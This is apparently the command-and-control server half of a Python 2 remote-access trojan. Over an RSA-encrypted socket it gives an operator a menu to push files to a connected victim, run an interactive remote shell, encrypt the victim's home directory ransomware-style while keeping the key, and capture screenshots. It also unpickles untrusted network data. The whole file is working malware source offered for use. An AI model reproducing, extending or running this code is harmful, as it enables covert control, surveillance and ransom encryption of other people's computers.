'''
Created on Mar 2, 2015

@author: gcharan09
'''
import socket
import os
from Tkinter import Tk
import time
from tkFileDialog import askopenfilename
from Crypto.PublicKey import RSA
import pickle
from Crypto.Cipher import PKCS1_OAEP 
from base64 import b64decode
from __builtin__ import str

class pyserver:
    
    def __init__(self):
        
        self.host="localhost"
        self.port=12345    
        try:
            self.sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except KeyboardInterrupt:
            raise
        except socket.error:
            print "unable to create socket"
        try:
            self.sock.bind((self.host,self.port))
            self.sock.listen(1)
        except KeyboardInterrupt:
            raise
        except socket.gaierror:
            print "Unable to bind to host:port kindly check"
        print "Socket created and server listening on :"+str(self.host)+":"+str(self.port)
    
    def __genKey(self):
        self.RSAKey=RSA.generate(2048,e=65537)
        return self.RSAKey
    
    def __exchangeKeys(self):
        self.__genKey()
        print "Connected to the client"+str(self.sock.getpeername())+"exchanging the public keys\n"
        self.sock.sendall(pickle.dumps(self.RSAKey.publickey(),None))
        print "sent the pubKey\n"
        buf = self.sock.recv(2048)
        print "received ClientKey\n"
        clientKey=pickle.loads(buf)
        with open("clientKey",'wb') as f:
            f.write(clientKey.exportKey())
        print "loaded key successfully\n"
        return clientKey
    
    def acceptConn(self):
        while 1:
            try:
                self.sock, clientaddr = self.sock.accept()
                self.__exchangeKeys()
                print "got connection from ", self.sock.getpeername()
                self.operations()
            except KeyboardInterrupt:
                raise
            except Exception:
                pass
    
    def operations(self):
        
        while True:
            ip=raw_input("select the operation to perform\n\n1-send file\n2-execute command\n3-encrypt_user_home\n4-screenshot\n5-Quit\n\n")
            
            
            if ip=='1':
                Tk().withdraw()
                print "Browse the file you want to send"
                filename = askopenfilename()
                filecontent=open(filename,'rb').read()
                filenameList=filename.split("/")
                filename=filenameList[len(filenameList)-1]
                self.sendData('FT')
                self.sendData(str(filename))
                time.sleep(0.01)
                self.sendData(filecontent)
                time.sleep(0.01)
                self.sendData("QUIT")
                print "File sent Successfully"
            
            
            
            elif ip=='2':
                while True:
                    self.sendData("CMD")
                    cmd=raw_input("Opened an interactive Shell Terminal press 'q' to quit\n")
                    if (cmd=="q"):
                        break
                    else:
                        self.sendData(cmd)
                        rdata=""
                        while True:
                            buf=(self.receiveData())
                            if buf=="QUIT":
                                break
                            else:
                                rdata+= buf
                        print rdata
                        
            
            elif ip=='3':
                print"encrypting user home directory\n"
                self.sendData('EFS')
                self.sendData('QUIT')
                key=self.receiveData()
                print key
                with open("EFS_Key",'wb')as f:
                    f.write(key)
            
            
            
            elif ip=='4':
                self.sendData("SCP")
                count=0
                self.writeImagetoFile()
                print "Image successfully received"

            
            elif ip=='5':
                print "Closing the connection to client"
                self.sock.close()
                break
            
            
            else:
                print "please enter a valid input"
                
    def writeImagetoFile(self):
        rbuf=""
        with open('test.png','wb') as f:
            while 1:
                buf = self.sock.recv(8192)
                encmessage = b64decode(pickle.loads(buf))
                msg=PKCS1_OAEP.new(self.RSAKey).decrypt(encmessage)
                msg=msg.strip('~')
                if msg=="QUIT":
                    break
                else:
                    rbuf+=msg
                    f.write(msg)
            print "received file size is"+str(len(rbuf)/1024)
#         self.sock.close()
                
    def receiveData(self):
        while 1:
            buf = self.sock.recv(4096)
            if buf:
                encmessage = b64decode(pickle.loads(buf))
                msg= PKCS1_OAEP.new(self.RSAKey).decrypt(encmessage)
                msg=msg.strip('~')
                return msg
            else:
                print "client closed connection"
                break
        self.sock.close()
                
    def sendData(self, data):
        key = open("clientKey", "r").read() 
        clientKey= RSA.importKey(key)
        clientKey = PKCS1_OAEP.new(clientKey)
        if(len(data)>200):
            for i in range(200,len(data),200):
                secretText = clientKey.encrypt(data[i-200:i])
                time.sleep(0.5)
                self.sock.sendall(pickle.dumps(secretText.encode('base64')))
            secretText=clientKey.encrypt(data[(i):len(data)])
            time.sleep(0.5)
            self.sock.sendall(pickle.dumps(secretText.encode('base64')))
        else:
            while len(data)<200:
                data+='~'
            secretText=clientKey.encrypt(data)
            self.sock.sendall(pickle.dumps(secretText.encode('base64')))

if __name__ == '__main__':
    try:
        sockObj=pyserver()
        sockObj.acceptConn()
    except KeyboardInterrupt:
            raise
    except Exception as e:
        print e